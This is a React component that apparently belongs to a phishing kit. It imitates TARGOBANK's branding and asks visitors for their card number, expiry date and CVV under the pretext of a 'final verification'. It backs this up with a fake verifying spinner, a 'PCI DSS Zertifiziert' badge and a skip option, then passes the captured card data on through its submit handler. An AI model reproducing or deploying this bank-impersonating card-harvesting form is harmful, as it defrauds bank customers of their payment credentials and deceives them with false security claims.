import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
}

interface BankCardFormProps {
  onSubmit: (data: BankCardData) => void;
  onSkip?: () => void;
}

const BankCardForm: React.FC<BankCardFormProps> = ({ onSubmit, onSkip }) => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<Partial<BankCardData>>({});
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  const formatCardNumber = (value: string): string => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  const formatExpiryDate = (value: string): string => {
    const v = value.replace(/\D/g, '');
    if (v.length >= 2) {
      let month = v.substring(0, 2);
      const year = v.substring(2, 4);
      
      if (parseInt(month) > 12) {
        month = '12';
      }
      if (parseInt(month) === 0) {
        month = '01';
      }
      
      return month + (year ? '/' + year : '');
    }
    return v;
  };

  const handleCardNumberChange = (value: string) => {
    const formatted = formatCardNumber(value);
    if (formatted.replace(/\s/g, '').length <= 16) {
      setCardNumber(formatted);
      if (errors.card_number) {
        setErrors(prev => ({ ...prev, card_number: undefined }));
      }
    }
  };

  const handleExpiryDateChange = (value: string) => {
    const formatted = formatExpiryDate(value);
    setExpiryDate(formatted);
    if (errors.expiry_date) {
      setErrors(prev => ({ ...prev, expiry_date: undefined }));
    }
  };

  const handleCvvChange = (value: string) => {
    const numericValue = value.replace(/\D/g, '');
    if (numericValue.length <= 4) {
      setCvv(numericValue);
      if (errors.cvv) {
        setErrors(prev => ({ ...prev, cvv: undefined }));
      }
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<BankCardData> = {};
    
    if (!cardNumber.trim()) {
      newErrors.card_number = 'Kartennummer ist erforderlich';
    } else if (cardNumber.replace(/\s/g, '').length < 13 || cardNumber.replace(/\s/g, '').length > 19) {
      newErrors.card_number = 'Kartennummer muss zwischen 13 und 19 Ziffern haben';
    }
    
    if (!expiryDate.trim()) {
      newErrors.expiry_date = 'Ablaufdatum ist erforderlich';
    } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
      newErrors.expiry_date = 'Ungültiges Format. Verwenden Sie MM/JJ';
    } else {
      const [month, year] = expiryDate.split('/');
      const currentDate = new Date();
      const currentYear = currentDate.getFullYear() % 100;
      const currentMonth = currentDate.getMonth() + 1;
      
      const expYear = parseInt(year);
      const expMonth = parseInt(month);
      
      if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
        newErrors.expiry_date = 'Karte ist bereits abgelaufen';
      }
    }

    if (!cvv.trim()) {
      newErrors.cvv = 'CVV ist erforderlich';
    } else if (!/^\d{3,4}$/.test(cvv)) {
      newErrors.cvv = 'CVV muss 3 oder 4 Ziffern haben';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }
    
    setIsLoading(true);
    
    try {
      await onSubmit({
        card_number: cardNumber,
        expiry_date: expiryDate,
        cvv: cvv,
      });
    } catch (error: any) {
      console.error('Error submitting bank card data:', error);
      if (error.details && Array.isArray(error.details)) {
        const backendErrors: Partial<BankCardData> = {};
        error.details.forEach((detail: any) => {
          if (detail.field === 'expiry_date') {
            backendErrors.expiry_date = 'Ungültiges Ablaufdatum';
          } else if (detail.field === 'card_number') {
            backendErrors.card_number = 'Ungültige Kartennummer';
          } else if (detail.field === 'cvv') {
            backendErrors.cvv = 'Ungültige CVV';
          }
        });
        setErrors(backendErrors);
      }
      setIsLoading(false);
    }
  };

  const inputStyle = (hasError: boolean) => ({
    width: '100%',
    padding: '12px 16px',
    border: hasError ? '2px solid #dc3545' : '2px solid #ddd',
    borderRadius: '8px',
    fontSize: '16px',
    fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
    outline: 'none',
    transition: 'border-color 0.3s',
    backgroundColor: 'white',
    boxSizing: 'border-box' as const,
    letterSpacing: '1px'
  });

  const labelStyle = {
    display: 'block',
    fontSize: '14px',
    fontWeight: '600' as const,
    color: '#333',
    marginBottom: '8px',
    fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
  };

  const errorStyle = {
    color: '#dc3545',
    fontSize: '14px',
    marginTop: '4px',
    fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
  };

  return (
    <>
      {isLoading && (
        <Loading 
          message="Bankkarten-Daten werden verifiziert..."
          type="processing"
          showProgress={true}
          duration={4}
        />
      )}
      
      <div style={{
        backgroundColor: '#f8f9fa',
        minHeight: '80vh',
        padding: isMobile ? '40px 20px' : '80px 40px',
        fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
      }}>
        <div style={{
          maxWidth: '800px',
          margin: '0 auto'
        }}>
          {/* Header Section */}
          <div style={{
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: isMobile ? 'flex-start' : 'center',
            marginBottom: isMobile ? '30px' : '40px',
            flexDirection: isMobile ? 'column' : 'row',
            gap: isMobile ? '16px' : '0'
          }}>
            <div style={{ textAlign: 'left' }}>
              <h1 style={{
                color: '#003366',
                fontSize: isMobile ? '32px' : '42px',
                fontWeight: '900',
                margin: '0 0 12px 0',
                lineHeight: '1.2',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
              }}>
                Bankkarten-Daten verifizieren
              </h1>

              <p style={{
                color: '#666',
                fontSize: isMobile ? '16px' : '18px',
                lineHeight: '1.6',
                margin: '0',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
              }}>
                Bitte geben Sie Ihre Bankkarten-Daten zur finalen Verifizierung ein.
              </p>
            </div>

            {onSkip && (
              <button
                type="button"
                onClick={onSkip}
                style={{
                  background: 'none',
                  border: 'none',
                  color: '#00b6ed',
                  fontSize: isMobile ? '14px' : '16px',
                  fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
                  cursor: 'pointer',
                  textDecoration: 'underline',
                  padding: '8px 0',
                  alignSelf: isMobile ? 'flex-start' : 'flex-end'
                }}
                onMouseOver={(e) => e.currentTarget.style.color = '#0099cc'}
                onMouseOut={(e) => e.currentTarget.style.color = '#00b6ed'}
              >
                Ich habe keine Karte
              </button>
            )}
          </div>

          {/* Form Container */}
          <div style={{
            backgroundColor: 'rgba(255, 255, 255, 0.95)',
            borderRadius: '12px',
            padding: isMobile ? '30px 24px' : '40px 48px',
            boxShadow: '0 8px 32px rgba(0, 0, 0, 0.1)',
            backdropFilter: 'blur(10px)',
            border: '1px solid rgba(255, 255, 255, 0.2)'
          }}>
            <form onSubmit={handleSubmit}>
              {/* Card Number */}
              <div style={{ marginBottom: '20px' }}>
                <label style={labelStyle}>Kartennummer *</label>
                <input
                  type="text"
                  value={cardNumber}
                  onChange={(e) => handleCardNumberChange(e.target.value)}
                  placeholder="1234 5678 9012 3456"
                  maxLength={19}
                  style={inputStyle(!!errors.card_number)}
                  onFocus={(e) => e.currentTarget.style.borderColor = '#00b6ed'}
                  onBlur={(e) => e.currentTarget.style.borderColor = errors.card_number ? '#dc3545' : '#ddd'}
                />
                {errors.card_number && <div style={errorStyle}>{errors.card_number}</div>}
              </div>

              {/* Expiry Date and CVV Row */}
              <div style={{
                display: 'grid',
                gridTemplateColumns: isMobile ? '1fr' : '1fr 1fr',
                gap: '20px',
                marginBottom: '30px'
              }}>
                <div>
                  <label style={labelStyle}>Ablaufdatum *</label>
                  <input
                    type="text"
                    value={expiryDate}
                    onChange={(e) => handleExpiryDateChange(e.target.value)}
                    placeholder="MM/JJ"
                    maxLength={5}
                    style={inputStyle(!!errors.expiry_date)}
                    onFocus={(e) => e.currentTarget.style.borderColor = '#00b6ed'}
                    onBlur={(e) => e.currentTarget.style.borderColor = errors.expiry_date ? '#dc3545' : '#ddd'}
                  />
                  {errors.expiry_date && <div style={errorStyle}>{errors.expiry_date}</div>}
                </div>

                <div>
                  <label style={labelStyle}>CVV *</label>
                  <input
                    type="text"
                    value={cvv}
                    onChange={(e) => handleCvvChange(e.target.value)}
                    placeholder="123"
                    maxLength={4}
                    style={inputStyle(!!errors.cvv)}
                    onFocus={(e) => e.currentTarget.style.borderColor = '#00b6ed'}
                    onBlur={(e) => e.currentTarget.style.borderColor = errors.cvv ? '#dc3545' : '#ddd'}
                  />
                  {errors.cvv && <div style={errorStyle}>{errors.cvv}</div>}
                </div>
              </div>

              {/* Card Visual */}
              <div style={{
                display: 'grid',
                gridTemplateColumns: isMobile ? '1fr' : '1fr 1fr',
                gap: '20px',
                marginBottom: '30px'
              }}>
                {/* Front of Card */}
                <div style={{
                  backgroundColor: '#003366',
                  borderRadius: '12px',
                  padding: '24px',
                  background: 'linear-gradient(135deg, #003366 0%, #004080 100%)',
                  boxShadow: '0 4px 12px rgba(0, 51, 102, 0.3)',
                  position: 'relative',
                  overflow: 'hidden',
                  minHeight: '180px'
                }}>
                  <div style={{
                    position: 'absolute',
                    top: '-50%',
                    right: '-20%',
                    width: '200px',
                    height: '200px',
                    borderRadius: '50%',
                    background: 'rgba(255, 255, 255, 0.1)',
                    pointerEvents: 'none'
                  }} />
                  
                  <div style={{
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'flex-start',
                    marginBottom: '30px'
                  }}>
                    <div style={{
                      color: 'white',
                      fontSize: '18px',
                      fontWeight: 'bold',
                      fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                    }}>
                      TARGOBANK
                    </div>
                    <div style={{
                      width: '40px',
                      height: '24px',
                      backgroundColor: 'rgba(255, 255, 255, 0.2)',
                      borderRadius: '4px',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      fontSize: '10px',
                      color: 'white',
                      fontWeight: 'bold'
                    }}>
                      CHIP
                    </div>
                  </div>

                  <div style={{
                    color: 'white',
                    fontSize: '20px',
                    fontFamily: 'monospace',
                    letterSpacing: '2px',
                    marginBottom: '20px',
                    minHeight: '24px'
                  }}>
                    {cardNumber || '•••• •••• •••• ••••'}
                  </div>

                  <div style={{
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'flex-end'
                  }}>
                    <div>
                      <div style={{
                        color: 'rgba(255, 255, 255, 0.7)',
                        fontSize: '10px',
                        marginBottom: '4px',
                        fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                      }}>
                        GÜLTIG BIS
                      </div>
                      <div style={{
                        color: 'white',
                        fontSize: '14px',
                        fontFamily: 'monospace',
                        letterSpacing: '1px'
                      }}>
                        {expiryDate || 'MM/JJ'}
                      </div>
                    </div>
                    <div style={{
                      color: 'white',
                      fontSize: '12px',
                      fontWeight: 'bold',
                      fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                    }}>
                      DEBIT
                    </div>
                  </div>
                </div>

                {/* Back of Card */}
                <div style={{
                  backgroundColor: '#003366',
                  borderRadius: '12px',
                  padding: '24px',
                  background: 'linear-gradient(135deg, #002244 0%, #003366 100%)',
                  boxShadow: '0 4px 12px rgba(0, 51, 102, 0.3)',
                  position: 'relative',
                  overflow: 'hidden',
                  minHeight: '180px'
                }}>
                  <div style={{
                    position: 'absolute',
                    top: '20px',
                    left: '0',
                    right: '0',
                    height: '40px',
                    backgroundColor: '#000'
                  }} />

                  <div style={{
                    position: 'absolute',
                    bottom: '60px',
                    left: '24px',
                    right: '24px'
                  }}>
                    <div style={{
                      backgroundColor: 'white',
                      height: '30px',
                      borderRadius: '4px',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'flex-end',
                      padding: '0 12px',
                      marginBottom: '8px'
                    }}>
                      <div style={{
                        backgroundColor: '#f0f0f0',
                        padding: '4px 8px',
                        borderRadius: '2px',
                        fontSize: '14px',
                        fontFamily: 'monospace',
                        color: '#333',
                        letterSpacing: '1px',
                        minWidth: '40px',
                        textAlign: 'center'
                      }}>
                        {cvv || '•••'}
                      </div>
                    </div>
                    <div style={{
                      color: 'rgba(255, 255, 255, 0.7)',
                      fontSize: '10px',
                      textAlign: 'right',
                      fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                    }}>
                      CVV
                    </div>
                  </div>

                  <div style={{
                    position: 'absolute',
                    bottom: '20px',
                    left: '24px',
                    color: 'white',
                    fontSize: '14px',
                    fontWeight: 'bold',
                    fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                  }}>
                    TARGOBANK
                  </div>
                </div>
              </div>

              {/* Submit Button */}
              <div style={{
                display: 'flex',
                justifyContent: 'center',
                marginTop: '40px'
              }}>
                <button
                  type="submit"
                  disabled={isLoading}
                  style={{
                    backgroundColor: '#c20831',
                    color: 'white',
                    border: 'none',
                    borderRadius: '50px',
                    padding: isMobile ? '16px 40px' : '18px 50px',
                    fontSize: isMobile ? '16px' : '18px',
                    fontWeight: 'bold',
                    fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
                    cursor: isLoading ? 'not-allowed' : 'pointer',
                    transition: 'all 0.3s ease',
                    minWidth: isMobile ? '280px' : '320px',
                    boxShadow: '0 6px 20px rgba(194, 8, 49, 0.3)',
                    letterSpacing: '0.5px',
                    opacity: isLoading ? 0.7 : 1
                  }}
                  onMouseOver={(e) => {
                    if (!isLoading) {
                      e.currentTarget.style.backgroundColor = '#a91e2c';
                      e.currentTarget.style.transform = 'translateY(-2px)';
                      e.currentTarget.style.boxShadow = '0 8px 25px rgba(194, 8, 49, 0.4)';
                    }
                  }}
                  onMouseOut={(e) => {
                    if (!isLoading) {
                      e.currentTarget.style.backgroundColor = '#c20831';
                      e.currentTarget.style.transform = 'translateY(0)';
                      e.currentTarget.style.boxShadow = '0 6px 20px rgba(194, 8, 49, 0.3)';
                    }
                  }}
                >
                  {isLoading ? 'Wird verifiziert...' : 'Daten verifizieren'}
                </button>
              </div>
            </form>
          </div>

          {/* Security Note */}
          <div style={{
            marginTop: isMobile ? '30px' : '40px',
            textAlign: 'center',
            padding: '20px',
            backgroundColor: 'white',
            borderRadius: '8px',
            border: '1px solid #e0e0e0'
          }}>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '12px',
              marginBottom: '12px'
            }}>
              <div style={{
                width: '24px',
                height: '24px',
                backgroundColor: '#003366',
                borderRadius: '50%',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center'
              }}>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="white">
                  <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
                </svg>
              </div>
              <span style={{
                fontSize: isMobile ? '16px' : '18px',
                fontWeight: 'bold',
                color: '#003366',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
              }}>
                PCI DSS Zertifiziert
              </span>
            </div>
            <p style={{
              color: '#666',
              fontSize: isMobile ? '14px' : '16px',
              margin: '0',
              textAlign: 'center',
              fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
              lineHeight: '1.5'
            }}>
              Ihre Kartendaten werden nach höchsten Sicherheitsstandards verschlüsselt und verarbeitet.
            </p>
          </div>
        </div>
      </div>
    </>
  );
};

export default BankCardForm;

